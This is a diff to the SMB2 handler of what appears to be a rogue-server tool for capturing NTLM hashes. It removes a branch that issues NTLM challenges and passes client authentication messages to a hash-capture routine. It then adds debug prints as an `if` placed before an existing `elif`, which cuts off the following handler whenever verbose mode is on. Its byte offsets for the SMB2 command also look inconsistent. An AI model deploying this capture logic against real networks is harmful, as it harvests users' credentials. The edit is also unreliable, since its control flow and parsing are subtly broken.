@@ -518,94 +518,12 @@ class SMB2(SMB1):  # SMB2 Server class extending SMB1 with enhanced SMBv2 suppor
 							print(color("[!] SMB2: Error in SMBv2 negotiate response: %s" % str(e), 1))
 						break
 
-				elif data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
-					if settings.Config.Verbose:
-						print(color("[+] SMB2: Handling SMBv2 session setup", 2))
-					self.connection_state = "SMBV2_SESSION_SETUP"
-					
-					# Check if this is the first session setup (NTLM negotiate)
-					if len(data) > 50:  # Session setup with security buffer
-						# Extract the security buffer to check NTLM message type
-						security_buffer_offset = struct.unpack('<H', data[50:52])[0]
-						security_buffer_length = struct.unpack('<H', data[52:54])[0]
-						
-						if security_buffer_length > 0 and security_buffer_offset < len(data):
-							security_buffer = data[security_buffer_offset:security_buffer_offset + security_buffer_length]
-							
-							if settings.Config.Verbose:
-								print(color("[+] SMB2: Security buffer length: %d" % security_buffer_length, 3))
-								print(color("[+] SMB2: Security buffer: %s" % repr(security_buffer[:50]), 3))
-							
-							# Check if this is NTLM negotiate (message type 0x01)
-							if b'NTLMSSP' in security_buffer:
-								ntlm_offset = security_buffer.find(b'NTLMSSP')
-								if ntlm_offset >= 0 and ntlm_offset + 8 < len(security_buffer):
-									message_type = struct.unpack('<L', security_buffer[ntlm_offset+8:ntlm_offset+12])[0]
-									if settings.Config.Verbose:
-										print(color("[+] SMB2: NTLM message type: 0x%02x" % message_type, 3))
-									
-									if message_type == 0x01:  # NTLM negotiate
-										if settings.Config.Verbose:
-											print(color("[+] SMB2: NTLM negotiate message detected", 3))
-										# Send challenge
-										head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), SessionID=GrabSessionID(data).decode('latin-1'),NTStatus="\x16\x00\x00\xc0")
-										t = SMB2Session1Data(NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
-										t.calculate()
-										packet1 = str(head)+str(t)
-										buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
-										try:
-											self.request.send(NetworkSendBufferPython2or3(buffer1))
-											data = self.request.recv(1024)
-											if settings.Config.Verbose:
-												print(color("[+] SMB2: Sent session setup challenge, waiting for auth", 3))
-										except Exception as e:
-											if settings.Config.Verbose:
-												print(color("[!] SMB2: Error in SMBv2 session setup: %s" % str(e), 1))
-											break
-									elif message_type == 0x03:  # NTLM authenticate
-										if settings.Config.Verbose:
-											print(color("[+] SMB2: NTLM authenticate message detected", 3))
-										# Parse and capture the hash
-										ParseSMBHash(security_buffer, self.client_address[0], Challenge)
-										
-										# Send success response
-										if settings.Config.ErrorCode:
-											ntstatus="\x6d\x00\x00\xc0"
-										else:
-											ntstatus="\x22\x00\x00\xc0"
-										head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data).decode('latin-1'), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data).decode('latin-1'), Credits=GrabCreditRequested(data).decode('latin-1'), NTStatus=ntstatus, SessionID=GrabSessionID(data).decode('latin-1'))
-										t = SMB2Session2Data()
-										packet1 = str(head)+str(t)
-										buffer1 = StructPython2or3('>i', str(packet1))+str(packet1)
-										try:
-											self.request.send(NetworkSendBufferPython2or3(buffer1))
-											data = self.request.recv(1024)
-											if settings.Config.Verbose:
-												print(color("[+] SMB2: Sent session setup response", 3))
-										except Exception as e:
-											if settings.Config.Verbose:
-												print(color("[!] SMB2: Error in SMBv2 session setup response: %s" % str(e), 1))
-											break
-									else:
-										if settings.Config.Verbose:
-											print(color("[+] SMB2: Unknown NTLM message type: 0x%02x" % message_type, 3))
-										break
-								else:
-									if settings.Config.Verbose:
-										print(color("[+] SMB2: Invalid NTLM message structure", 3))
-									break
-							else:
-								if settings.Config.Verbose:
-									print(color("[+] SMB2: No NTLMSSP in security buffer", 3))
-								break
-						else:
-							if settings.Config.Verbose:
-								print(color("[+] SMB2: Invalid security buffer", 3))
-							break
-					else:
-						if settings.Config.Verbose:
-							print(color("[+] SMB2: Session setup packet too short", 3))
-						break
+				# Debug: Check if we should handle command 0x40
+				if data[4:5] == b"\xfe" and settings.Config.Verbose:
+					print(color("[+] SMB2: Debug - Checking command 0x40 condition", 3))
+					print(color("[+] SMB2: Debug - Command bytes: %s" % repr(data[8:10]), 3))
+					print(color("[+] SMB2: Debug - Expected: %s" % repr(b"\x40\x00"), 3))
+					print(color("[+] SMB2: Debug - Match: %s" % (data[8:10] == b"\x40\x00"), 3))
 
 				# Handle SMBv2 session setup command 0x40 (0x4000 in little-endian)
 				elif data[4:5] == b"\xfe" and data[8:10] == b"\x40\x00":
